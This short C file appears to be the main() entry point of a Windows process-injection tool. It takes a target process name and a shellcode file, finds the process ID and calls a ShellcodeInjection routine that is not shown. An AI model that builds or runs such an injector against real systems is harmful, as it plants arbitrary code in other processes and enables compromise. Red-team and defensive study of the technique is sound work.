# include "injection.h"
# include <windows.h>
# include <stdio.h>

int main(int argc, char** argv) {
	printf(" __        __    _     _            __        __    _     _           \n");
	printf(" \\ \\      / /_ _| |__ | |__  _   _  \\ \\      / /__ | |__ | |__  _   _ \n");
	printf("  \\ \\ /\\ / / _` | '_ \\| '_ \\| | | |  \\ \\ /\\ / / _ \\| '_ \\| '_ \\| | | |\n");
	printf("   \\ V  V / (_| | |_) | |_) | |_| |   \\ V  V / (_) | |_) | |_) | |_| |\n");
	printf("    \\_/\\_/ \\__,_|_.__/|_.__/ \\__, |    \\_/\\_/ \\___/|_.__/|_.__/ \\__, |\n");
	printf("                             |___/                              |___/ \n\n");

	if (argc != 3) {
		yapBad("Usage: [PROCESS] [SHELLCODE.BIN]");
		return EXIT_FAILURE;
	}

	int PID = findPID(argv[1]);

	if (PID <= 0 || PID == 0) {
		yapBad("Shellcode injection failed");
		return EXIT_FAILURE;
	};

	if (!ShellcodeInjection(PID, argv[2])) {
		yapBad("Shellcode injection failed");
		return EXIT_FAILURE;
	}

	yapOkay("Shellcode injection successfull");
	return EXIT_SUCCESS;
}
